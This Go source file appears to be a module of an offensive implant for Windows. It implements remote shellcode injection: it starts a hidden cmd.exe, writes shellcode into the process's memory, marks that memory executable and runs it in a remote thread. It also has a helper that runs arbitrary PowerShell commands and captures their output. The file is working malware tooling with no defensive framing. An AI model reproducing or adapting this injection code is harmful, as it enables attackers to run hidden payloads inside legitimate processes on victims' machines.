//go:build windows && debug

package modules

import (
	"errors"
	"log"
	"os/exec"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

//This function executes shellcode by doing the following:
//1. Start C:\\Windows\\System32\\cmd.exe process with the window hidden
//2. Allocate memory in the cmd.exe process and write the shellcode into it
//3. Start a remote thread in the cmd.exe process that executes the shellcode

// I initially wanted to run a thread in the process of the implant itself, but for some reason, the program kept crashing. This is a workaround for now.
func ShellcodeExec(shellcode []byte) error {
	log.Println("[START] Injecting shellcode into another process")
	program := "C:\\Windows\\System32\\cmd.exe"

	log.Println("Loading kernel32.dll and necessary procedures...")
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")

	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	strPtr, _ := syscall.UTF16PtrFromString(program)
	log.Println("Starting cmd.exe process")
	errCreateProcess := windows.CreateProcess(strPtr, nil, nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, startupInfo, procInfo)
	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
		return errors.New("error calling CreateProcess: " + errCreateProcess.Error())
	}

	log.Println("Getting handle to newly spawned process...")
	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, procInfo.ProcessId)
	if errOpenProcess != nil {
		return errors.New("error calling OpenProcess: " + errOpenProcess.Error())
	}

	log.Println("Allocating memory inside cmd.exe")
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("error calling VirtualAlloc: " + errVirtualAlloc.Error())
	}
	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	log.Println("Writing shellcode into allocated memory...")
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		return errors.New("error calling WriteProcessMemory: " + errWriteProcessMemory.Error())
	}

	log.Println("Changing permissions of memory page...")
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New("error calling VirtualProtectEx: " + errVirtualProtectEx.Error())
	}

	log.Println("Starting remote thread...")
	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		return errors.New("error calling CreateRemoteThreadEx: " + errCreateRemoteThreadEx.Error())
	}
	windows.CloseHandle(pHandle)

	log.Println("[SUCCESS] Shellcode execution started in another process")
	return nil
}

// Executes a command in Powershell and returns stdout
func Exec(cmd string) ([]byte, error) {
	log.Printf("[START WINDOWS EXEC] Powershell command: %s\n", cmd)
	command := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", cmd)
	byteOut, err := command.CombinedOutput()
	if err != nil {
		log.Printf("[ERROR WINDOWS EXEC] error: %s\n", err.Error())
		return nil, err
	}
	log.Printf("[SUCCESS WINDOWS EXEC] result: %s\n", string(byteOut))
	return byteOut, nil
}
